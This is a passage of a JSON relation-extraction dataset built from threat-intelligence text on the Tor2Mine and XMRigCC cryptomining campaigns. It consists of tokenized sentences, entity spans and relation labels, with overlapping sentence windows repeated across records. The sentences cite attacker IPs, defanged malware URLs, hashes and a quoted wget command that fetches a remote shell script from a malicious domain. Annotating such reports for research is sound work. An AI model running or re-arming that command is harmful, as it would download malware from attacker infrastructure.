"24_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "t": 4, "h": 5}, {"r": "RF", "evidence": [2], "t": 4, "h": 5}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "t": 6, "h": 7}, {"r": "CO", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [3], "t": 8, "h": 9}, {"r": "ST", "evidence": [3, 4], "t": 8, "h": 11}, {"r": "RF", "evidence": [3, 4], "t": 8, "h": 11}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [4], "h": 11, "t": 14}, {"r": "EX", "evidence": [4], "h": 14, "t": 15}, {"r": "IJ", "evidence": [4, 5, 6], "h": 14, "t": 19}, {"r": "CO", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "EX", "evidence": [6], "t": 18, "h": 19}, {"r": "ST", "evidence": [6], "h": 19, "t": 20}, {"r": "RF", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [6], "t": 18, "h": 19}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 23}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "FR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "t": 21, "h": 23}]}, {"title": "087-17", "sents": [["We", "first", "observed", "these", "domains", "being", "hosted", "on", "185.10.68.147", "on", "March", "15", ",", "2020", ",", "according", "to", "Umbrella", ",", "and", "they", "remain", "associated", "as", "of", "this", "writing", "."], ["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "185.10.68.147", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "XMRigCC", "pos": [10, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "XMRig", "pos": [15, 16], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "actors", "pos": [21, 22], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [64, 64], "name": "185.10.68.147", "pos": [13, 14], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [81, 81], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [85, 85], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [94, 94], "name": "actors", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "PowerShell commands", "pos": [9, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": ".ps1", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [105, 105], "name": "Mshta", "pos": [16, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": ".hta", "pos": [19, 20], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "Shell script file", "pos": [6, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [128, 128], "name": "file", "pos": [4, 5], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [134, 134], "name": "wget request", "pos": [10, 12], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [137, 137], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [152, 152], "name": "VirusTotal", "pos": [11, 12], "index": "19_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [158, 158], "name": "wget request", "pos": [17, 19], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [171, 171], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [184, 184], "name": "195.123.234.33", "pos": [7, 8], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "XMRigCC", "pos": [10, 11], "index": "23_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [1], "t": 1, "h": 2}, {"r": "RF", "evidence": [1], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "t": 5, "h": 6}, {"r": "ST", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "RF", "evidence": [2, 3], "t": 5, "h": 8}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 10}, {"r": "FR", "evidence": [3], "h": 8, "t": 11}, {"r": "EX", "evidence": [3], "h": 11, "t": 12}, {"r": "IJ", "evidence": [3, 4, 5], "h": 11, "t": 16}, {"r": "CO", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 15}, {"r": "EX", "evidence": [5], "t": 15, "h": 16}, {"r": "ST", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [5], "t": 15, "h": 16}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 20}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "FR", "evidence": [6], "h": 19, "t": 20}, {"r": "WR", "evidence": [6], "t": 18, "h": 20}, {"r": "ST", "evidence": [7], "t": 22, "h": 23}, {"r": "RF", "evidence": [7], "t": 22, "h": 23}]}, {"title": "087-18", "sents": [["This", "IP", "also", "hosts", "fh.fhcwk4q.xyz", ",", "a", "domain", "associated", "with", "XMRigCC", ",", "a", "variant", "of", "XMRig", "leveraged", "by", "many", "different", "threat", "actors", "."], ["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."], ["File", "containing", "the", "Tor2Mine", "IP", "and", "domain", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [4, 4], "name": "fh.fhcwk4q.xyz", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "XMRigCC", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "XMRig", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "actors", "pos": [21, 22], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "185.10.68.147", "pos": [13, 14], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [53, 53], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [57, 57], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "actors", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "PowerShell commands", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [74, 74], "name": ".ps1", "pos": [13, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "Mshta", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": ".hta", "pos": [19, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [89, 89], "name": "Shell script file", "pos": [6, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "file", "pos": [4, 5], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [106, 106], "name": "wget request", "pos": [10, 12], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [109, 109], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [124, 124], "name": "VirusTotal", "pos": [11, 12], "index": "18_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [130, 130], "name": "wget request", "pos": [17, 19], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [143, 143], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [156, 156], "name": "195.123.234.33", "pos": [7, 8], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "XMRigCC", "pos": [10, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [177, 177], "name": "File", "pos": [0, 1], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [180, 180], "name": "Tor2Mine", "pos": [3, 4], "index": "24_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "t": 2, "h": 3}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "EX", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [2], "h": 7, "t": 10}, {"r": "EX", "evidence": [2], "h": 10, "t": 11}, {"r": "IJ", "evidence": [2, 3, 4], "h": 10, "t": 15}, {"r": "CO", "evidence": [3], "h": 12, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "EX", "evidence": [4], "t": 14, "h": 15}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "RD", "evidence": [4], "t": 14, "h": 15}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 19}, {"r": "CO", "evidence": [4, 5], "h": 16, "t": 20}, {"r": "FR", "evidence": [5], "h": 18, "t": 19}, {"r": "WR", "evidence": [5], "t": 17, "h": 19}, {"r": "ST", "evidence": [6], "t": 21, "h": 22}, {"r": "RF", "evidence": [6], "t": 21, "h": 22}]}, {"title": "087-19", "sents": [["In", "addition", "to", "these", "domains", ",", "we", "also", "found", "several", "URLs", "hosted", "on", "185.10.68.147", "in", "VirusTotal", "that", "are", "structurally", "similar", "to", "many", "of", "the", "aforementioned", "Tor2Mine", "URLs", ",", "such", "as", "hxxp", ":", "//185.10.68.147/win/update.hta", "and", "hxxp", ":", "//185.10.68.147/win/del.ps1", "."], ["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."], ["File", "containing", "the", "Tor2Mine", "IP", "and", "domain", "."], ["One", "such", "file", ",", "3c2d83b9e9b1b107c3db1185229", ",", "has", "embedded", "URLs", "that", "are", "hosted", "on", "107.181.187.132", "(", "e.", "g.", ",", "hxxp", ":", "//107.181.160.197/lin/32/xmrig", ")", ",", "which", "we", "previously", "mentioned", "is", "a", "known", "Tor2Mine", "IP", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "185.10.68.147", "pos": [13, 14], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [30, 30], "name": "hxxp : //185.10.68.147/win/update.hta", "pos": [30, 33], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [34, 34], "name": "hxxp : //185.10.68.147/win/del.ps1", "pos": [34, 37], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "actors", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "PowerShell commands", "pos": [9, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": ".ps1", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "Mshta", "pos": [16, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [57, 57], "name": ".hta", "pos": [19, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "Shell script file", "pos": [6, 9], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [77, 77], "name": "file", "pos": [4, 5], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [83, 83], "name": "wget request", "pos": [10, 12], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [86, 86], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "VirusTotal", "pos": [11, 12], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [107, 107], "name": "wget request", "pos": [17, 19], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [120, 120], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [133, 133], "name": "195.123.234.33", "pos": [7, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "XMRigCC", "pos": [10, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [154, 154], "name": "File", "pos": [0, 1], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [157, 157], "name": "Tor2Mine", "pos": [3, 4], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [166, 166], "name": "3c2d83b9e9b1b107c3db1185229", "pos": [4, 5], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [170, 170], "name": "URLs", "pos": [8, 9], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [175, 175], "name": "107.181.187.132", "pos": [13, 14], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [180, 180], "name": "hxxp : //107.181.160.197/lin/32/xmrig", "pos": [18, 21], "index": "24_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "h": 3, "t": 6}, {"r": "EX", "evidence": [1], "h": 6, "t": 7}, {"r": "IJ", "evidence": [1, 2, 3], "h": 6, "t": 11}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "ST", "evidence": [3], "h": 11, "t": 12}, {"r": "RF", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "t": 10, "h": 11}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 16}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "t": 13, "h": 15}, {"r": "ST", "evidence": [5], "t": 17, "h": 18}, {"r": "RF", "evidence": [5], "t": 17, "h": 18}, {"r": "ST", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "RF", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 21}, {"r": "CO", "evidence": [7], "h": 23, "t": 24}, {"r": "CO", "evidence": [7], "t": 22, "h": 23}]}, {"title": "087-20", "sents": [["As", "previously", "noted", ",", "Tor2Mine", "actors", "were", "observed", "using", "PowerShell", "commands", "to", "download", ".ps1", "files", "and", "Mshta", "to", "execute", ".hta", "files", "."], ["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."], ["File", "containing", "the", "Tor2Mine", "IP", "and", "domain", "."], ["One", "such", "file", ",", "3c2d83b9e9b1b107c3db1185229", ",", "has", "embedded", "URLs", "that", "are", "hosted", "on", "107.181.187.132", "(", "e.", "g.", ",", "hxxp", ":", "//107.181.160.197/lin/32/xmrig", ")", ",", "which", "we", "previously", "mentioned", "is", "a", "known", "Tor2Mine", "IP", "."], ["According", "to", "the", "blog", ",", "there", "were", "several", "domains", "referenced", "in", "the", "configuration", "for", "an", "XMRigCC", "payload", "during", "these", "campaigns", ",", "including", "eu.minerpool.pw", "and", "rs.fym5gserobhh.pw", ",", "both", "lexically", "similar", "to", "the", "eu1.minerpool.pw", "and", "v1.fym5gserobhh.pw", "domains", "we", "discovered", "in", "our", "recent", "research", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "actors", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "PowerShell commands", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": ".ps1", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "Mshta", "pos": [16, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": ".hta", "pos": [19, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "Shell script file", "pos": [6, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "4d21cab49f7d7dd7d39df72b244a249", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "file", "pos": [4, 5], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [45, 45], "name": "wget request", "pos": [10, 12], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [48, 48], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [13, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "daa768e8d66aa224491000e891f1ef2cb7c", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "VirusTotal", "pos": [11, 12], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [69, 69], "name": "wget request", "pos": [17, 19], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "hxxp : //asq.r77vh0.pw/lin/update.sh", "pos": [30, 33], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [95, 95], "name": "195.123.234.33", "pos": [7, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [98, 98], "name": "XMRigCC", "pos": [10, 11], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "File", "pos": [0, 1], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "Tor2Mine", "pos": [3, 4], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "3c2d83b9e9b1b107c3db1185229", "pos": [4, 5], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [132, 132], "name": "URLs", "pos": [8, 9], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [137, 137], "name": "107.181.187.132", "pos": [13, 14], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [142, 142], "name": "hxxp : //107.181.160.197/lin/32/xmrig", "pos": [18, 21], "index": "21_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [165, 165], "name": "domains", "pos": [8, 9], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "XMRigCC payload", "pos": [15, 17], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "campaigns", "pos": [19, 20], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [179, 179], "name": "eu.minerpool.pw", "pos": [22, 23], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [181, 181], "name": "rs.fym5gserobhh.pw", "pos": [24, 25], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "eu1.minerpool.pw", "pos": [31, 32], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [190, 190], "name": "v1.fym5gserobhh.pw", "pos": [33, 34], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [0], "h": 3, "t": 4}, {"r": "IJ", "evidence": [0, 1, 2], "h": 3, "t": 8}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2], "t": 7, "h": 8}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "t": 10, "h": 12}, {"r": "ST", "evidence": [4], "t": 14, "h": 15}, {"r": "RF", "evidence": [4], "t": 14, "h": 15}, {"r": "ST", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RF", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}, {"r": "CO", "evidence": [6], "t": 19, "h": 20}, {"r": "UK", "evidence": [5, 6, 7], "t": 16, "h": 24}, {"r": "ST", "evidence": [7], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "CO", "evidence": [7], "h": 25, "t": 28}, {"r": "CO", "evidence": [7], "h": 25, "t": 27}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}, {"r": "CO", "evidence": [7], "t": 22, "h": 25}]}, {"title": "087-21", "sents": [["The", "IP", "also", "has", "a", "communicating", "Shell", "script", "file", "(", "4d21cab49f7d7dd7d39df72b244a249", ")", "."], ["The", "content", "of", "this", "file", "includes", "a", "string", "with", "a", "wget", "request", "to", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "."], ["From", "there", ",", "we", "identified", "a", "file", "(", "daa768e8d66aa224491000e891f1ef2cb7c", ")", "in", "VirusTotal", "whose", "content", "shows", "an", "identical", "wget", "request", "(", "``", "wget", "--", "user-agent", "``", "linux", "''", "-q", "-O", "-", "hxxp", ":", "//asq.r77vh0.pw/lin/update.sh", "''", ")", "."], ["This", "file", "reaches", "out", "to", "the", "aforementioned", "195.123.234.33", ",", "an", "XMRigCC", "IP", "that", "previously", "hosted", "the", "newly", "identified", "domains", ",", "according", "to", "VirusTotal", "and", "Umbrella", ",", "respectively", "."], ["File", "containing", "the", "Tor2Mine", "IP", "and", "domain", "."], ["One", "such", "file", ",", "3c2d83b9e9b1b107c3db1185229", ",", "has", "embedded", "URLs", "that", "are", "hosted", "on", "107.181.187.132", "(", "e.", "g.", ",", "hxxp", ":", "//107.181.160.197/lin/32/xmrig", ")", ",", "which", "we", "previously", "mentioned", "is", "a", "known", "Tor2Mine", "IP", "."], 